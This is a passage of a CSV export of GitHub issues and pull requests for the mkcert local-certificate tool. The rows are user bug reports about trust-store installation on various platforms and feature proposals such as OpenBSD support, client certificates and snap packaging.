This is going to be useful for testing configurations with hybrid certificates (RSA + ECDSA) or ECDSA-only certificate.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/118/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/118/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/118/events,https://github.com/FiloSottile/mkcert/issues/118,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/116,398005250,MDU6SXNzdWUzOTgwMDUyNTA=,116,[Question] How to add Root CA with chromium installed by snap,6603411,closed,FALSE,NA,NA,7,2019-01-10T20:39:22Z,2019-06-01T15:28:10Z,2019-06-01T15:28:10Z,NONE,NA,"Hello, 

Nice project work as a charm :+1:, 

I have a little question, I use chromium with snapcraft.

When i do `mkcert -install` this add Root CA in default path for chrome (and work fine this default chrome on linux) but not with chromium browser installed by snap 

![image](https://user-images.githubusercontent.com/6603411/50995253-dea3f500-151e-11e9-8e1e-20abd4d84cd6.png)

Default path for Root CA is `sql:$HOME/.pki/nssdb` but with snap is `sql:/home/alexandre/snap/chromium/current/.pki/nssdb`.

Do you have an idea for it to work in my case ? Can we change the default path of root CA? What is the certutils command for add the root ca in my chromium?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/116/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/116/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/116/events,https://github.com/FiloSottile/mkcert/issues/116,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/115,397716118,MDU6SXNzdWUzOTc3MTYxMTg=,115,Bad naming when used on IIS,2525536,closed,FALSE,NA,NA,10,2019-01-10T08:14:16Z,2019-09-12T18:08:02Z,2019-02-02T21:27:04Z,NONE,NA,"Hello,

When importing the certificates into IIS, the Organization Unit (OU) and Organization (O) are shown in the UI, which is the same across all certificates. 

I could be helpful to use one of the domains (the first one, possibly), or the certificate file name in the Organisation field of the certificate to easily differentiate the different certificates in bad GUI's.

This is the imported certificates on he IIS. _(Censored parts are my host and user name)_
![image](https://user-images.githubusercontent.com/2525536/50954562-09f2f980-14b7-11e9-928b-09812ec9811c.png)

This is where I select my certificate for a site binding. _(Censored parts are my host and user name)_
![image](https://user-images.githubusercontent.com/2525536/50954505-dc0db500-14b6-11e9-8b6c-110236444c8d.png)

",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/115/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/115/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/115/events,https://github.com/FiloSottile/mkcert/issues/115,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/114,397669422,MDU6SXNzdWUzOTc2Njk0MjI=,114,How to delete Local CA,2293969,closed,FALSE,NA,NA,5,2019-01-10T04:39:25Z,2019-01-12T01:37:37Z,2019-01-12T01:37:37Z,NONE,NA,"While running mkcert -install, i provided a password which I can't remember. Is there a way to delete local CA and create it again?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/114/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/114/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/114/events,https://github.com/FiloSottile/mkcert/issues/114,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/113,397495290,MDExOlB1bGxSZXF1ZXN0MjQzNDI5MDAx,113,Added .localhost name constraint to CA certificate,896184,closed,FALSE,NA,NA,3,2019-01-09T18:20:45Z,2019-02-02T21:10:56Z,2019-02-02T21:10:56Z,NONE,NA,"The name constraint extension that has been added to the CA certificate
should mean that the certificate is only trusted for domains that end in
`.localhost`. This has the benefit that the certificate cannot be used
to intercept connections to other domains, and the drawback that name
constraints are not well supported and mkcert can no longer issue certificates
to non-`.localhost` domains.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/113/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/113/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/113/events,https://github.com/FiloSottile/mkcert/pull/113,https://api.github.com/repos/FiloSottile/mkcert/pulls/113
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/112,397332882,MDU6SXNzdWUzOTczMzI4ODI=,112,[feature] Read out hosts file for localhost and 127.0.0.1 aliases,164625,closed,FALSE,NA,NA,1,2019-01-09T11:40:15Z,2019-01-09T22:16:05Z,2019-01-09T22:16:05Z,NONE,NA,"Would save some keystrokes if the tool would read out the hosts file optionally. All ::1, localhost and 127.0.0.1 entries could then be used as input for mkcert.
`mkcert --hosts`

Would that make sense as a PR?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/112/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/112/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/112/events,https://github.com/FiloSottile/mkcert/issues/112,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/111,397300121,MDU6SXNzdWUzOTczMDAxMjE=,111,Nothing happened after installation on Windows,25668079,closed,FALSE,NA,NA,4,2019-01-09T10:15:09Z,2019-01-09T22:12:14Z,2019-01-09T22:12:14Z,NONE,NA,"Hallo,
after i run 
`$ mkcert localhost`
and show all success message like in the README.md
but when i accessing my localhost nothing happened? 
still can't access through https?
why? is there any other configuration?

im using windows 10, and Wampserver",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/111/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/111/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/111/events,https://github.com/FiloSottile/mkcert/issues/111,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/110,397149209,MDExOlB1bGxSZXF1ZXN0MjQzMTY1MDM4,110,Add OpenBSD support,1825202,open,FALSE,NA,NA,0,2019-01-09T00:10:28Z,2019-09-10T13:47:35Z,NA,NONE,NA,Adds support for OpenBSD. No global system store so just adds to firefox/chromium.,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/110/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/110/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/110/events,https://github.com/FiloSottile/mkcert/pull/110,https://api.github.com/repos/FiloSottile/mkcert/pulls/110
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/109,397071718,MDExOlB1bGxSZXF1ZXN0MjQzMTAzMTA4,109,Update README.md,1320709,closed,FALSE,NA,NA,0,2019-01-08T20:24:17Z,2019-01-08T20:42:52Z,2019-01-08T20:42:52Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/109/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/109/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/109/events,https://github.com/FiloSottile/mkcert/pull/109,https://api.github.com/repos/FiloSottile/mkcert/pulls/109
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/108,397004432,MDExOlB1bGxSZXF1ZXN0MjQzMDUxMzUy,108,Added a visualisation of code,46450021,closed,FALSE,NA,NA,1,2019-01-08T17:16:11Z,2019-01-08T17:19:19Z,2019-01-08T17:19:19Z,NONE,NA,If you like feel free to merge it :),NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/108/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/108/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/108/events,https://github.com/FiloSottile/mkcert/pull/108,https://api.github.com/repos/FiloSottile/mkcert/pulls/108
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/107,396953460,MDU6SXNzdWUzOTY5NTM0NjA=,107,Chrome reporting ERR_SPDY_INADEQUATE_TRANSPORT_SECURITY,2914558,closed,FALSE,NA,NA,3,2019-01-08T15:20:15Z,2019-01-11T20:52:03Z,2019-01-08T17:07:01Z,NONE,NA,"A search on this error reports:
A deployment of HTTP/2 over TLS 1.2 SHOULD NOT use any of the cipher suites that are listed in the cipher suite black list.

I'm not sure how to change the cipher, or possibly the cipher order.

Is there something I can to do, to fix this?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/107/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/107/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/107/events,https://github.com/FiloSottile/mkcert/issues/107,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/106,396873010,MDU6SXNzdWUzOTY4NzMwMTA=,106,Integrated server,300061,closed,FALSE,NA,NA,10,2019-01-08T11:51:58Z,2019-06-01T15:29:38Z,2019-06-01T15:29:38Z,NONE,NA,"Hi
It's really nice idea to have a tool like this to spin up secure servers for development.
What I think is missing here to cover this use-case is a simple utility to run a server with generated certificate.
I think this should work something like 

`mkcert serve --listen 0.0.0.0:8080 --reverse-proxy 127.0.0.1:8081`

So if we just need to check some application how it's working with HTTPS terminated on front-end server, we run this command and set up reverse proxy to our application.

Important thing that headers like X-Forwarded-Proto should be passed to the end application.

What do you think?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/106/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/106/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/106/events,https://github.com/FiloSottile/mkcert/issues/106,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/105,396859066,MDU6SXNzdWUzOTY4NTkwNjY=,105,Error on mkcert -install (Mac OSX mojave),307049,closed,FALSE,NA,NA,7,2019-01-08T11:12:23Z,2019-01-09T07:28:18Z,2019-01-08T17:28:54Z,NONE,NA,"Hi,

Just installed mkcert (and nss) via homebrew, then run the command `mkcert -install` which hangs with the following message:

> Using the local CA at ""/Users/<user>/Library/Application Support/mkcert"" ✨
Password:
ERROR: failed to parse trust settings: plist: error parsing XML property list: XML syntax error on line 111: illegal character code U+0000

The two files have been correctly created in ~/Library/Application Support/mkcert:

> -r--------    1 <user>  staff   2,4K  8 jan 09:41 rootCA-key.pem
> -rw-r--r--    1 <user>  staff   1,6K  8 jan 09:41 rootCA.pem
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/105/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/105/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/105/events,https://github.com/FiloSottile/mkcert/issues/105,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/104,396813414,MDU6SXNzdWUzOTY4MTM0MTQ=,104,Windows10 Professional 64-bit can not install CA certificate,29391890,open,FALSE,NA,NA,14,2019-01-08T09:16:57Z,2020-03-31T14:49:03Z,NA,NONE,NA,"C:\WINDOWS\system32>mkcert -install
Using the local CA at ""C:\Users\pwn\AppData\Local\mkcert"" ✨
ERROR: add cert: Failed adding cert: The access control list (ACL) structure is invalid.

I tried to search for google-related unsolvable (ACL) issues, but did not find a suitable solution.
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/104/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/104/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/104/events,https://github.com/FiloSottile/mkcert/issues/104,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/103,396619912,MDExOlB1bGxSZXF1ZXN0MjQyNzU5MDg4,103,"Elaborate on ""nss""-related installs",213281,closed,FALSE,NA,NA,2,2019-01-07T19:34:26Z,2019-01-08T17:57:57Z,2019-01-08T17:43:07Z,NONE,NA,https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/103/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/103/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/103/events,https://github.com/FiloSottile/mkcert/pull/103,https://api.github.com/repos/FiloSottile/mkcert/pulls/103
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/102,396615211,MDExOlB1bGxSZXF1ZXN0MjQyNzU1NDgz,102,Add 'Firefox Nightly.app' for macOS.,331262,closed,FALSE,NA,NA,1,2019-01-07T19:20:16Z,2019-01-08T17:22:21Z,2019-01-08T17:22:14Z,CONTRIBUTOR,NA,"Added FirefoxNightly.app for macOS, as similar to 'Firefox Developer Edition', it gets installed with a different name (as per brew https://github.com/Homebrew/homebrew-cask-versions/blob/8a61151ae75b0d87723e024256b036c511cd6096/Casks/firefox-nightly.rb#L112)",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/102/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/102/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/102/events,https://github.com/FiloSottile/mkcert/pull/102,https://api.github.com/repos/FiloSottile/mkcert/pulls/102
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/101,396604664,MDU6SXNzdWUzOTY2MDQ2NjQ=,101,firefox ssl length error,3171252,closed,FALSE,NA,NA,2,2019-01-07T18:48:11Z,2019-02-02T19:53:27Z,2019-02-02T19:53:27Z,NONE,NA,"hey! thanks for making this - been looking for a local SSL solution for a while so hoping to add this to my workflow. I just added the url to the local url (`test.localhost`), but getting this error using firefox:

> SSL received a record that exceeded the maximum permissible length. Error code: SSL_ERROR_RX_RECORD_TOO_LONG 

did some digging, and dropping firefox's TLS version from 1.3 to 1.2 (in `about:config` changing `security.tls.version.max` from **4** to **3**) was a proposed solution, but this didn't work for me. any ideas? I searched issues here and haven't seen anyone else experience this.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/101/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/101/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/101/events,https://github.com/FiloSottile/mkcert/issues/101,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/100,396585358,MDExOlB1bGxSZXF1ZXN0MjQyNzMzMjc5,100,nss: write a notice about being asked for db password,120951,open,FALSE,NA,NA,5,2019-01-07T17:47:59Z,2021-04-19T07:28:09Z,NA,CONTRIBUTOR,NA,Issue: https://github.com/FiloSottile/mkcert/issues/50 ,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/100/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/100/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/100/events,https://github.com/FiloSottile/mkcert/pull/100,https://api.github.com/repos/FiloSottile/mkcert/pulls/100
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/99,396575950,MDU6SXNzdWUzOTY1NzU5NTA=,99,Couldn't find manifest for 'mkcert'.,1503577,closed,FALSE,NA,NA,2,2019-01-07T17:20:13Z,2019-01-08T19:59:34Z,2019-01-08T19:59:34Z,NONE,NA,` scoop install mkcert` does not work.,NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/99/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/99/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/99/events,https://github.com/FiloSottile/mkcert/issues/99,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/98,396536704,MDU6SXNzdWUzOTY1MzY3MDQ=,98,wrong version number,1090129,closed,FALSE,NA,NA,2,2019-01-07T15:41:43Z,2020-03-03T08:14:18Z,2019-01-07T16:31:11Z,NONE,NA,"Hi all,

I get a cryptic error:

```
Uncaught Error: write EPROTO 4478952896:error:1408F10B:SSL routines:ssl3_get_record:wrong version number:../deps/openssl/openssl/ssl/record/ssl3_record.c:252:

      at WriteWrap.onWriteComplete [as oncomplete] (internal/stream_base_commons.js:66:16)
```

Following is almost a copy of your documentation:

```NODE_EXTRA_CA_CERTS: /Users/dmitrymedvedev/Library/Application Support/mkcert/rootCA.pem```

```
const CA_PATH = path.resolve('./certs');
const httpsConfig = {
  get cert() {
    return readFileSync(path.resolve(path.join(CA_PATH, 'localhost+2.pem')));
  },
  get key() {
    return readFileSync(
      path.resolve(path.join(CA_PATH, 'localhost+2-key.pem')),
    );
  },
};

// ...

const httpsServer = new https.createServer(httpsConfig);

this.wss = new WebSocket.Server(
  Object.assign(
    {},
    this.settings.wss,
    { server: httpsServer },
  ),
);
```",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/98/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/98/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/98/events,https://github.com/FiloSottile/mkcert/issues/98,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/97,396480078,MDU6SXNzdWUzOTY0ODAwNzg=,97,Add support for ARM or Raspberry Pi3,6258894,closed,FALSE,NA,NA,5,2019-01-07T13:07:03Z,2020-11-19T10:15:36Z,2019-01-07T16:15:58Z,NONE,NA,"Can you please add support for armv7
uname -a= Linux 4.14.79-v7+ #1159 SMP Sun Nov 4 17:50:20 GMT 2018 armv7l GNU/Linux

was trying to compile but I hit the wall with this error.
```

root@raspi:~/go/pkg/mod# export GOPATH=""/bin/mkcert""
root@raspi:/opt/mkcert-1.2.0# go build
go: finding github.com/DHowett/go-plist v0.0.0-20180609054337-500bd5b9081b
go: finding golang.org/x/text v0.3.0
go: finding golang.org/x/net v0.0.0-20180627171509-e514e69ffb8b
go: finding software.sslmate.com/src/go-pkcs12 v0.0.0-20180114231543-2291e8f0f237
go: downloading golang.org/x/net v0.0.0-20180627171509-e514e69ffb8b
go: downloading software.sslmate.com/src/go-pkcs12 v0.0.0-20180114231543-2291e8f0f237
go: downloading golang.org/x/text v0.3.0
root@raspi:/opt/mkcert-1.2.0# mkcert
-bash: mkcert: command not found
root@raspi:/opt/mkcert-1.2.0# which mkcert
root@raspi:/opt/mkcert-1.2.0# go version
go version go1.11.4 linux/arm
```",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/97/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/97/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/97/events,https://github.com/FiloSottile/mkcert/issues/97,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/96,396465868,MDU6SXNzdWUzOTY0NjU4Njg=,96,Error running mkcert-v1.2.0-windows-amd64.exe -install,672350,closed,FALSE,NA,NA,9,2019-01-07T12:19:18Z,2019-06-02T11:57:36Z,2019-06-02T11:57:36Z,NONE,NA,"I'm receiving an error when runing mkcert 1.2.0 on Windows.  I downloaded the prebuilt binary.

Windows 10 1809 17763.195
Running cmd.exe as Administrator.

ERROR: failed to generate CA certificate: asn1: string not valid UTF-8",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/96/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/96/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/96/events,https://github.com/FiloSottile/mkcert/issues/96,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/95,396412648,MDU6SXNzdWUzOTY0MTI2NDg=,95,Add runtime flag for specifying trust stores to install to,191754,closed,FALSE,NA,NA,4,2019-01-07T09:35:52Z,2019-02-03T09:38:59Z,2019-02-02T21:27:05Z,NONE,NA,"I wish there was a flag to specify which trust stores to install to, for example *only* to Firefox's. The current default is to install in system (requires sudo), Chrome (which I don't use), and Firefox trust stores.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/95/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/95/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/95/events,https://github.com/FiloSottile/mkcert/issues/95,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/94,396347441,MDU6SXNzdWUzOTYzNDc0NDE=,94,Error while installing the CA `mkcert -install`,453878,closed,FALSE,NA,NA,2,2019-01-07T04:52:48Z,2019-01-08T06:40:00Z,2019-01-08T06:40:00Z,NONE,NA,"I am getting the below error while issuing `mkcert -install`

```
Using the local CA at ""/Users/spadmanabhan/Library/Application Support/mkcert"" ✨
ERROR: failed to execute ""security add-trusted-cert"": exit status 1

SecTrustSettingsSetTrustSettings: errSecInternalComponent
```",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/94/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/94/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/94/events,https://github.com/FiloSottile/mkcert/issues/94,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/93,392221494,MDExOlB1bGxSZXF1ZXN0MjM5NTQwODg5,93,Add support for building snaps,43789966,closed,FALSE,NA,NA,3,2018-12-18T15:58:16Z,2019-01-06T22:54:13Z,2019-01-06T22:54:13Z,NONE,NA,"Hi Filippo,

Mkcert looks like an interesting tool - I wish I had this back in 2008 when I was doing a lot of stuff around web servers. Oh well.

Anyway, I want to ask you to add support for snaps.

Now, snaps are cross-distro Linux software packages, supported on LTS and non-LTS Ubuntu, as well as many others distributions. Having mkcert as a snap would make it available to millions of users through the Snap Store (snapcraft.io/store), and also allow you to provide automatic updates with any changes to all your users. I guess this would make a lot of sense if there are vulnerabilities in the nss library, and people need updates fast, and you want to make sure everyone is fully aligned.

Snaps make for a really good use case here, as they are self-contained and isolated. In fact, I built mkcert as a strictly confined application, and if you decide to do snap building, you can play and tweak with whatthe snap can do some more.

TL;DR - technical details - for how to build snaps locally. I used Ubuntu 18.04 LTS as the build system.

snap install snapcraft --classic --beta
git clone https://github.com/igorljubuncic/mkcert.git
cd mkcert
git checkout add-snapcraft
snapcraft

The last command creates a <mkcert-version>.snap file, something like mkcert_1.0_amd64.snap.

This snap can be installed and tested locally with:

snap install mkcert_1.0_amd64.snap --dangerous

The --dangerous flag is necessary because the snap hasn’t yet gone through the snap store review process and is not digitally signed.

The mkcert command can be executed, e.g.: snap run mkcert <options>.

Then, you will need to get the snap actually published in the store:

- Register a developer account in the snap store https://snapcraft.io/account.
- Register the mkcert name in the store. 

snapcraft login
snapcraft register

- Upload a built snap to the store. The store supports multiple risk levels as “channels”. We have edge, beta, candidate and stable, which denote the level of stability. Typically, you start with edge and promote to other channels as you complete testing and validation.

snapcraft push mkcert_1.0_amd64.snap --release edge

- Test installing on a clean machine to see everything works as you expect.

snap install mkcert --edge

After you have completed your testing and you're happy, you can push a stable release to the stable channel. The next step after that is to update the store page, and promote the application online. We will gladly help there, and we'd be happy to feature your application in our store. Feel free to reach out if you have any questions or concerns.
",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/93/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/93/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/93/events,https://github.com/FiloSottile/mkcert/pull/93,https://api.github.com/repos/FiloSottile/mkcert/pulls/93
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/92,386951822,MDU6SXNzdWUzODY5NTE4MjI=,92,error: unknown option `-i',20768148,closed,FALSE,NA,NA,6,2018-12-03T18:42:29Z,2018-12-03T20:17:03Z,2018-12-03T20:17:03Z,NONE,NA,"I am trying to run mkcert within Ubuntu on Windows 10. While reading [this guide](https://github.com/Shopify/slate/wiki/Getting-Started) on how to create a Slate theme for Shopify, I downloaded `brew` on my Ubuntu terminal, then ran `brew install mkcert`. Now, for some reason, when I run `mkcert -install`, it returns:

    error: unknown option `i'

Further, when I tried to run `brew remove mkcert` in an attempt to uninstall and reinstall, mkcert didn't actually get removed during that process and it's just kind of stuck like that now. Has anyone ever seen this before?

![capture](https://user-images.githubusercontent.com/20768148/49394316-27cf8080-f6f9-11e8-8bf2-935fa12be76f.PNG)

It's even doing the same thing when I download from Chocolatey in Powershell.

![capture](https://user-images.githubusercontent.com/20768148/49394475-a0364180-f6f9-11e8-8dbb-7110af0540ee.PNG)
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/92/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/92/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/92/events,https://github.com/FiloSottile/mkcert/issues/92,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/91,384352445,MDExOlB1bGxSZXF1ZXN0MjMzNTc0NDIy,91,README: AUR,784224,closed,FALSE,NA,NA,0,2018-11-26T14:22:00Z,2018-11-26T16:57:51Z,2018-11-26T16:57:51Z,CONTRIBUTOR,NA,"## Rationale

Arch Linux does not support AUR helpers ([ref](https://wiki.archlinux.org/index.php/AUR_helpers)), so the README should reflect the recommended [install process](https://wiki.archlinux.org/index.php/Arch_User_Repository#Installing_packages).

I realize this is pedantic, but users should be guided towards the Arch way of installing AUR packages, and not to a single user's preferred method of managing AUR packages.

## Code change

No code has been changed, only the `README.md` file has been altered.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/91/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/91/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/91/events,https://github.com/FiloSottile/mkcert/pull/91,https://api.github.com/repos/FiloSottile/mkcert/pulls/91
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/90,379464906,MDExOlB1bGxSZXF1ZXN0MjI5OTE1NDk5,90,java: don't run keytool during check if we there isn't even one found,120951,closed,FALSE,NA,NA,1,2018-11-10T21:51:10Z,2018-11-26T17:32:36Z,2018-11-26T17:03:41Z,CONTRIBUTOR,NA,"If JAVA_HOME isn't set then keytoolPath has an invalid path. This means checkJava() fails and doesn't tell the problem clearly to the user.

Issue: https://github.com/FiloSottile/mkcert/issues/88",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/90/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/90/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/90/events,https://github.com/FiloSottile/mkcert/pull/90,https://api.github.com/repos/FiloSottile/mkcert/pulls/90
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/89,376953851,MDExOlB1bGxSZXF1ZXN0MjI4MDQ4MzQ5,89,Add support for client certificates,44654,closed,FALSE,NA,NA,3,2018-11-02T20:17:37Z,2019-12-17T22:32:05Z,2019-02-02T21:27:05Z,CONTRIBUTOR,NA,"This change adds a new flag for client certificates. When this flag is passed, the extended key usage for the generated certificate is for client authentication instead of server authentication.

I am not 100% sure this is a good idea, but I found myself needing to generate both server and client certificates for a project and thought that `mkcert` could fit both of those cases.

The change was remarkably easy to make so I figured I'd submit a PR.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/89/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/89/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/89/events,https://github.com/FiloSottile/mkcert/pull/89,https://api.github.com/repos/FiloSottile/mkcert/pulls/89
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/88,376344262,MDU6SXNzdWUzNzYzNDQyNjI=,88,"[macOS Mojave] ERROR: failed to execute ""keytool -list"" on ""mkcert -install""",2664036,closed,FALSE,NA,NA,12,2018-11-01T10:55:01Z,2018-11-26T17:03:43Z,2018-11-26T17:03:43Z,NONE,NA,"On macOS Mojave 10.14 (18A391) using iTerm2 Build 3.2.5 and zsh 5.6.2 (x86_64-apple-darwin18.0.0)
and Homebrew 1.8.1 Homebrew/homebrew-core (git revision d338a; last commit 2018-11-01)

Installed mkcert with:
```
# brew install mkcert
# brew install nss
```

Then running command `mkcert -install` fails with:
```
Created a new local CA at ""/Users/tommasoricci/Library/Application Support/mkcert"" 💥
The local CA is now installed in the system trust store! ⚡️
The local CA is now installed in the Firefox trust store (requires browser restart)! 🦊
ERROR: failed to execute ""keytool -list"": fork/exec bin/keytool: no such file or directory
```",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/88/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/88/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/88/events,https://github.com/FiloSottile/mkcert/issues/88,NA
